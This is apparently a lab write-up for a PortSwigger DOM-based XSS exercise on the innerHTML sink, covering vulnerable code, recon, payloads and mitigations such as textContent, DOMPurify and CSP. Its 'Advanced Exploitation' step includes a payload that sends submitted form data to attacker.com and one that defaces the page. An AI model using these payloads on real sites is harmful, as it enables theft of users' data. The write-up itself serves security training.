# DOM XSS - innerHTML Sink

## Lab Link
https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink

## Difficulty
Apprentice

## Vulnerability Type
DOM-Based Cross-Site Scripting (XSS) - innerHTML Sink

## Theory
The `innerHTML` property is used to get or set the HTML content of an element. When user input is directly assigned to `innerHTML`, it parses and executes any HTML/JavaScript in the string.

Vulnerable code:
```javascript
var search = document.location.hash.slice(1);
var element = document.getElementById('result');
element.innerHTML = '<h2>Search results for: ' + search + '</h2>';
```

Key difference from `document.write()`: innerHTML doesn't re-parse the entire document, just the target element's content.

## Recon Process
1. Inspect page source for `innerHTML` usage
2. Find where it reads user input (hash, query params, etc.)
3. Test with HTML injection: `<h1>test</h1>`
4. Escalate to JavaScript: `<img src=x onerror="alert('XSS')">`
5. Verify the vulnerability in the target element

## Exploitation Steps

### Step 1: Locate innerHTML Target
- Find which element uses `innerHTML`
- Check browser console for element IDs
- Note the location in the DOM

### Step 2: Craft HTML Injection Payload
```
Payload: <img src=x onerror="alert('innerHTML XSS')">
URL: https://target.com/page#<img src=x onerror="alert('innerHTML XSS')">
```

### Step 3: Execute Payload
- Modify URL hash with payload
- Page JavaScript reads and sets innerHTML
- Alert fires when image fails to load

### Step 4: Advanced Exploitation
```html
<!-- Steal form data -->
<img src=x onerror="document.onsubmit=e=>{fetch('http://attacker.com/formdata?data='+new FormData(e.target));}">

<!-- Modify page content -->
<img src=x onerror="document.body.innerHTML='<h1>Hacked</h1>'">
```

## Root Cause
- User input flows to `innerHTML` without sanitization
- `innerHTML` parses HTML entities including tags
- Event handlers in injected HTML execute immediately
- No filtering of dangerous HTML

## Impact
- **Session Hijacking:** Capture cookies and session tokens
- **Credential Harvesting:** Replace forms with fake ones
- **Malware Distribution:** Inject malicious scripts
- **User Redirection:** Redirect to phishing sites

## Mitigations

### 1. **Use textContent Instead**
```javascript
// Bad
document.getElementById('result').innerHTML = userInput;

// Good  
document.getElementById('result').textContent = userInput;
```

### 2. **Sanitize HTML Input**
```javascript
// Using DOMPurify library
var clean = DOMPurify.sanitize(userInput);
document.getElementById('result').innerHTML = clean;
```

### 3. **Use template literals with createElement**
```javascript
const div = document.createElement('div');
div.textContent = userInput;
document.getElementById('result').appendChild(div);
```

### 4. **HTML Encode User Data**
```javascript
function htmlEscape(str) {
  return str.replace(/[&<>"']/g, char => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;',
    '"': '&quot;', "'": '&#39;'
  })[char]);
}
var safe = htmlEscape(userInput);
document.getElementById('result').innerHTML = '<p>' + safe + '</p>';
```

### 5. **Content Security Policy**
```
Content-Security-Policy: script-src 'self'; object-src 'none';
```

## Key Lesson
`innerHTML` is dangerous with user input. Always prefer `textContent` or proper HTML sanitization.
